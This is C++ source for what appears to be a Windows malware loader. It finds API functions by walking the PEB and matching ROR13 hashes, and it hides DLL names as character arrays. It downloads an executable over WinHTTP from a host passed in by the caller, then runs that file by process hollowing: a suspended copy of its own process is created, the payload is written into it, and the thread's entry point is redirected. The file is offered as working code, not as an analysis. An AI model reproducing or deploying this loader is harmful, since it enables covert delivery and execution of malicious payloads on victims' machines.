
#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))

HMODULE RmExecute::GetProcAddressWithHash(DWORD dwModuleFunctionHash)
{
	PPEB PebAddress;
	PMY_PEB_LDR_DATA pLdr;
	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
	PVOID pModuleBase;
	PIMAGE_NT_HEADERS pNTHeader;
	DWORD dwExportDirRVA;
	PIMAGE_EXPORT_DIRECTORY pExportDir;
	PLIST_ENTRY pNextModule;
	DWORD dwNumFunctions;
	USHORT usOrdinalTableIndex;
	PDWORD pdwFunctionNameBase;
	PCSTR pFunctionName;
	UNICODE_STRING BaseDllName;
	DWORD dwModuleHash;
	DWORD dwFunctionHash;
	PCSTR pTempChar;
	DWORD i;

#if defined(_WIN64)
	PebAddress = (PPEB)__readgsqword(0x60);
#elif defined(_M_ARM)
	PebAddress = (PPEB)((ULONG_PTR)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
	__emit(0x00006B1B);
#else
	PebAddress = (PPEB)__readfsdword(0x30);
#endif

	pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
	pNextModule = pLdr->InLoadOrderModuleList.Flink;
	pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;

	while (pDataTableEntry->DllBase != NULL)
	{
		dwModuleHash = 0;
		pModuleBase = pDataTableEntry->DllBase;
		BaseDllName = pDataTableEntry->BaseDllName;
		pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
		dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

		//获取下一个模块地址
		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;

		// 如果当前模块不导出任何函数，则转到下一个模块 加载模块入口
		if (dwExportDirRVA == 0)
		{
			continue;
		}

		//计算模块哈希值
		for (i = 0; i < BaseDllName.MaximumLength; i++)
		{
			pTempChar = ((PCSTR)BaseDllName.Buffer + i);

			dwModuleHash = ROTR32(dwModuleHash, 13);

			if (*pTempChar >= 0x61)
			{
				dwModuleHash += *pTempChar - 0x20;
			}
			else
			{
				dwModuleHash += *pTempChar;
			}
		}

		pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);

		dwNumFunctions = pExportDir->NumberOfNames;
		pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);

		for (i = 0; i < dwNumFunctions; i++)
		{
			dwFunctionHash = 0;
			pFunctionName = (PCSTR)(*pdwFunctionNameBase + (ULONG_PTR)pModuleBase);
			pdwFunctionNameBase++;

			pTempChar = pFunctionName;

			do
			{
				dwFunctionHash = ROTR32(dwFunctionHash, 13);
				dwFunctionHash += *pTempChar;
				pTempChar++;
			} while (*(pTempChar - 1) != 0);

			dwFunctionHash += dwModuleHash;

			if (dwFunctionHash == dwModuleFunctionHash)
			{
				usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
				return (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));
			}
		}
	}

	return NULL;
}




void RmExecute::Initfunctions(Pfunctions pfn)
{


	pfn->fnLoadLibraryA = (pfnLoadLibraryA)GetProcAddressWithHash(HASH_LoadLibraryA);


	


	
	
	//获取LoadLibraryA函数地址
	
	
	pfn->fnGetModuleFileNameA = (pfnGetModuleFileNameA)GetProcAddressWithHash(HASH_GetModuleFileNameA);
	
	char szUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szUser32);
	char szMsvcrt[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szMsvcrt);
	char szWinhttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', 0 };
	pfn->fnLoadLibraryA(szWinhttp);

	pfn->fnMessageBoxA = (pfnMessageBoxA)GetProcAddressWithHash(HASH_MessageBoxA);
	pfn->fnCreateProcessA = (pfnCreateProcessA)GetProcAddressWithHash(HASH_CreateProcessA);
	pfn->fnGetThreadContext = (pfnGetThreadContext)GetProcAddressWithHash(HASH_GetThreadContext);
	pfn->fnReadProcessMemory = (pfnReadProcessMemory)GetProcAddressWithHash(HASH_ReadProcessMemory);
	pfn->fnVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddressWithHash(HASH_VirtualAllocEx);
	pfn->fnWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddressWithHash(HASH_WriteProcessMemory);
	pfn->fnSetThreadContext = (pfnSetThreadContext)GetProcAddressWithHash(HASH_SetThreadContext);
	pfn->fnResumeThread = (pfnResumeThread)GetProcAddressWithHash(HASH_ResumeThread);
	pfn->fnVirtualAlloc = (pfnVirtualAlloc)GetProcAddressWithHash(HASH_VirtualAlloc);
	

	
	
	

	
	

	pfn->fnmalloc = (pfnmalloc)GetProcAddressWithHash(HASH_malloc);
	pfn->fnfree = (pfnfree)GetProcAddressWithHash(HASH_free);
	pfn->fnmemset = (pfnmemset)GetProcAddressWithHash(HASH_memset);
	pfn->fnmemcpy = (pfnmemcpy)GetProcAddressWithHash(HASH_memcpy);
	pfn->fnmemcmp = (pfnmemcmp)GetProcAddressWithHash(HASH_memcmp);
	pfn->fnstrlen = (pfnstrlen)GetProcAddressWithHash(HASH_strlen);
	pfn->fnstrcpy = (pfnstrcpy)GetProcAddressWithHash(HASH_strcpy);
	pfn->fnstrcat = (pfnstrcat)GetProcAddressWithHash(HASH_strcat);


	

	pfn->fnWinHttpOpen = (pfnWinHttpOpen)GetProcAddressWithHash(HASH_WinHttpOpen);
	pfn->fnWinHttpConnect = (pfnWinHttpConnect)GetProcAddressWithHash(HASH_WinHttpConnect);
	pfn->fnWinHttpOpenRequest = (pfnWinHttpOpenRequest)GetProcAddressWithHash(HASH_WinHttpOpenRequest);
	pfn->fnWinHttpAddRequestHeaders = (pfnWinHttpAddRequestHeaders)GetProcAddressWithHash(HASH_WinHttpAddRequestHeaders);
	pfn->fnWinHttpSendRequest = (pfnWinHttpSendRequest)GetProcAddressWithHash(HASH_WinHttpSendRequest);
	pfn->fnWinHttpReceiveResponse = (pfnWinHttpReceiveResponse)GetProcAddressWithHash(HASH_WinHttpReceiveResponse);
	pfn->fnWinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)GetProcAddressWithHash(HASH_WinHttpQueryDataAvailable);
	pfn->fnWinHttpReadData = (pfnWinHttpReadData)GetProcAddressWithHash(HASH_WinHttpReadData);
	pfn->fnWinHttpCloseHandle = (pfnWinHttpCloseHandle)GetProcAddressWithHash(HASH_WinHttpCloseHandle);


}


// 用完一定要free
int RmExecute::HttpDownload(wchar_t* target, wchar_t* path, INTERNET_PORT port,BOOL useSSL =FALSE) {

	
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	DWORD dwLast = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	 newbuff = NULL;
	


	// Use WinHttpOpen to obtain a session handle.
	wchar_t Sign[] = { 'W','i','n','H','T','T','P',' ','E','x','a','m','p','l','e','/','1','.','0','\0' };
	
	hSession = fn.fnWinHttpOpen(Sign,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	
	// Specify an HTTP server.
	if (hSession)
		hConnect = fn.fnWinHttpConnect(hSession, target,
			port, 0);
	wchar_t GET[] = { 'G','E','T','\0' };
	// Create an HTTP request handle.
	if (hConnect){}
		

		hRequest = fn.fnWinHttpOpenRequest(hConnect, GET, path,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			useSSL ? WINHTTP_FLAG_SECURE : 0);




/*
#ifndef _WIN64
	LPCWSTR header = L"Accept-platform: x86\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#else
	LPCWSTR header = L"Accept-platform: x64\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#endif
*/


	// Send a request.
	if (hRequest)
		bResults = fn.fnWinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);


	// End the request.
	if (bResults)
		bResults = fn.fnWinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!fn.fnWinHttpQueryDataAvailable(hRequest, &dwSize))
				return dwLast;
			// Allocate space for the buffer.
			//pszOutBuffer = new char[dwSize + 1];
			BOOL Second = FALSE;
			if (dwLast != 0) {
				newbuff = (char *)fn.fnmalloc(dwLast + dwSize + 1);
				fn.fnmemset(newbuff, 0, dwLast + dwSize + 1);
				fn.fnmemcpy(newbuff, pszOutBuffer, dwLast);
				fn.fnfree(pszOutBuffer);
				pszOutBuffer = newbuff;
				dwLast += dwSize;
				Second = TRUE;
			}
			else {
				newbuff = (LPSTR)fn.fnmalloc(dwSize + 1);
				pszOutBuffer = newbuff;
				dwLast = dwSize;
				
			}
			if (!pszOutBuffer)
			{
				return dwLast;
				dwSize = 0;
			}
			else
			{
				// Read the data.
				//ZeroMemory(pszOutBuffer, dwSize + 1);
				
				BOOL Flag;
				if (Second) {

					Flag = fn.fnWinHttpReadData(hRequest, (LPVOID)(pszOutBuffer + dwLast-dwSize),
						dwSize, &dwDownloaded);
				}
				else {
					fn.fnmemset(pszOutBuffer, 0, dwSize + 1);
					Flag = fn.fnWinHttpReadData(hRequest, (LPVOID)(pszOutBuffer),
						dwSize, &dwDownloaded);
				}
				if (!Flag)
					return dwLast;
				

				// Free the memory allocated to the buffer.
				//delete[] pszOutBuffer;
				//fn.fnfree(pszOutBuffer);

			}
		} while (dwSize > 0);
	}


	// Report any errors.
	if (!bResults)
		return dwLast;

	// Close any open handles.
	if (hRequest) fn.fnWinHttpCloseHandle(hRequest);
	if (hConnect) fn.fnWinHttpCloseHandle(hConnect);
	if (hSession) fn.fnWinHttpCloseHandle(hSession);
	return dwLast;
}

#ifdef _WIN64
bool RmExecute::RunPortableExecutable() {
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	ULONG_PTR* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(newbuff); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(ULONG_PTR(newbuff) + DOSHeader->e_lfanew); // Initialize

	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Rbx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, newbuff, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(ULONG_PTR(newbuff) + DOSHeader->e_lfanew + 248 + (ULONG_PTR)(count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(ULONG_PTR(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(ULONG_PTR(newbuff) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rbx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the rax register
				CTX->Rax = ULONG_PTR(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				return 0;
			}
		}
	}
}
#else
bool RmExecute::RunPortableExecutable()
{
	
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase = NULL;; //Base address of the image
	void* pImageBase = NULL;; // Pointer to the image base

	char CurrentFilePath[MAX_PATH];

	DOSHeader = PIMAGE_DOS_HEADER(newbuff); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(newbuff) + DOSHeader->e_lfanew); // Initialize

	fn.fnGetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		//ZeroMemory(&PI, sizeof(PI)); // Null the memory
		//ZeroMemory(&SI, sizeof(SI)); // Null the memory
		fn.fnmemset(&PI, 0, sizeof(PI));
		fn.fnmemset(&SI, 0, sizeof(SI));
		if (fn.fnCreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) //make process in suspended state, for the new image.																				      
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(fn.fnVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (fn.fnGetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				fn.fnReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				pImageBase = fn.fnVirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				//fix randomly crash
				if (pImageBase == 0) {
					fn.fnResumeThread(PI.hThread);
					return 1;
				}
				else {
					// Write the image to the process
					fn.fnWriteProcessMemory(PI.hProcess, pImageBase, newbuff, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(newbuff) + DOSHeader->e_lfanew + 248 + (count * 40));
						fn.fnWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress), LPVOID(DWORD(newbuff) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					fn.fnWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

					// Move address of entry point to the eax register
					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					fn.fnSetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
					fn.fnResumeThread(PI.hThread); //?Start the process/call main()
				}

				return true; // Operation was successful.
			}
		}
	}
	return false;
}
#endif